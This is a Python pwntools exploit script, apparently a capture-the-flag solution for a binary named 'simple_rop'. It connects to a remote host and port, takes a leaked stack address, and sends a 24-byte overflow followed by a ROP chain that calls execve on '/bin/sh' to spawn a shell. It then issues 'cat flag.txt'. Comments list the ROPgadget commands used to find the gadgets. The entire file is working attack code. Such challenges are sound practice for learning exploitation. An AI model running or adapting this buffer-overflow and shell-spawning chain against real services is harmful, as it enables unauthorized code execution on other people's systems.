#!/usr/bin/env python3
from pwn import *
from pwn import p64

context.binary = ELF("./simple_rop")
context.log_level = "debug"

# Gadget addresses (from your ROPgadget output)
pop_rax_ret = 0x427f2b
pop_rdi_pop_rbp_ret = 0x402188
pop_rsi_ret = 0x4104c2
pop_rdx_ret = 0x413270
syscall_gadget = 0x401324

# Syscall numbers
SYS_execve = 59 # 0x3b

# Start the process (replace with remote connection if applicable)
# p = process('./simple_rop')
p = remote('140.113.207.245', 30173)

# Receive the leaked stack address
p.recvuntil(b"stack address ")
buf_addr_str = p.recvline().strip().decode()
buf_addr = int(buf_addr_str, 16)
log.info(f"Buffer address: {hex(buf_addr)}")

# Calculate the address for "/bin/sh"
# "/bin/sh" will be placed 104 bytes after the start of buf
# (24 bytes junk + 80 bytes ROP chain)
bin_sh_addr = buf_addr + 104

# Construct the ROP chain
rop_chain = b''
rop_chain += p64(pop_rdi_pop_rbp_ret)  # pop rdi; pop rbp; ret
rop_chain += p64(bin_sh_addr)          # RDI = address of "/bin/sh"
rop_chain += p64(0x0)                  # Dummy value for RBP
rop_chain += p64(pop_rsi_ret)          # pop rsi; ret
rop_chain += p64(0x0)                  # RSI = 0 (NULL)
rop_chain += p64(pop_rdx_ret)          # pop rdx; ret
rop_chain += p64(0x0)                  # RDX = 0 (NULL)
rop_chain += p64(pop_rax_ret)          # pop rax; ret
rop_chain += p64(SYS_execve)           # RAX = 59 (execve syscall number)
rop_chain += p64(syscall_gadget)       # syscall

# Final payload
payload = b'A' * 24                    # Initial junk to overwrite RBP and reach return address
payload += rop_chain
payload += b'/bin/sh\x00'              # The string "/bin/sh" null-terminated

# Send the payload
p.sendline(payload)

p.sendline(b'cat flag.txt')

flag = p.recvline().decode().strip()
print(f"\033[93;1mFlag: {flag}\033[0m")
p.close()


# ROPgadget --binary ./simple_rop --only 'pop|ret' | grep -E 'rdi|rsi|rdx|rax'
# ROPgadget --binary ./simple_rop --string '/bin/sh'
# ROPgadget --binary ./simple_rop --only 'syscall'